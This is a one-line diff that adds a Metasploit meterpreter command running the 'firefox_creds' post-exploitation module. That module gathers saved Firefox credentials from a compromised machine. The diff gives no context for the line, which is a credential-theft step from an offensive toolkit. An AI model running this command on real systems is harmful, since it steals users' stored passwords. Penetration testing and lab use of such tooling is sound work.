@@ -1,0 +1,1 @@
+meterpreter > run post/multi/gather/firefox_creds
